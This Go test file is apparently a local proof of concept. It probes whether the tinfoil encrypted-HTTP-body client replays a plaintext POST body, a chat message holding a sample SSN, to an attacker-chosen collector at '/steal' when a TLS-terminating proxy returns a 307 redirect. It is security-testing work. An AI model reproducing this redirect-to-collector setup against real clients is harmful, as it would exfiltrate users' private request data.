package redirect

// Local-only: does a 307 from a TLS-terminating intermediary make the EHBP Go
// client re-send the PLAINTEXT body to an attacker-chosen Location?
// Client built exactly as tinfoil-go builds it: NewTransportWithIdentity(id)
// with no options, used as the Transport of an outer http.Client.

import (
	"crypto/tls"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"

	"github.com/tinfoilsh/encrypted-http-body-protocol/client"
	"github.com/tinfoilsh/encrypted-http-body-protocol/identity"
)

func TestRedirect307ReplaysBody(t *testing.T) {
	serverID, err := identity.NewIdentity()
	if err != nil {
		t.Fatal(err)
	}
	pub, _ := identity.FromPublicKeyHex(serverID.MarshalPublicKeyHex())

	var mu sync.Mutex
	var collected []string
	collector := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		mu.Lock()
		collected = append(collected, string(b))
		mu.Unlock()
		w.WriteHeader(204)
	}))
	defer collector.Close()

	// TLS-terminating intermediary in front of the enclave: answers 307.
	proxy := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		io.Copy(io.Discard, r.Body)
		http.Redirect(w, r, collector.URL+"/steal", http.StatusTemporaryRedirect)
	}))
	defer proxy.Close()
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{RootCAs: proxy.Client().Transport.(*http.Transport).TLSClientConfig.RootCAs}

	tr, err := client.NewTransportWithIdentity(pub)
	if err != nil {
		t.Fatal(err)
	}
	hc := &http.Client{Transport: tr}
	secret := `{"messages":[{"role":"user","content":"TOP-SECRET 307 redirect: SSN 078-05-1120"}]}`
	req, _ := http.NewRequest(http.MethodPost, proxy.URL+"/v1/chat/completions", strings.NewReader(secret))
	resp, err := hc.Do(req)
	if err != nil {
		t.Logf("client error: %v", err)
	} else {
		t.Logf("client status: %d", resp.StatusCode)
		resp.Body.Close()
	}
	mu.Lock()
	defer mu.Unlock()
	leaked := false
	for i, c := range collected {
		pl := strings.Contains(c, "078-05-1120")
		leaked = leaked || pl
		if len(c) > 120 {
			c = c[:120] + "..."
		}
		t.Logf("collector got %d: plaintext=%v body=%q", i, pl, c)
	}
	t.Logf("RESULT leaked_plaintext_to_redirect_target=%v", leaked)
}
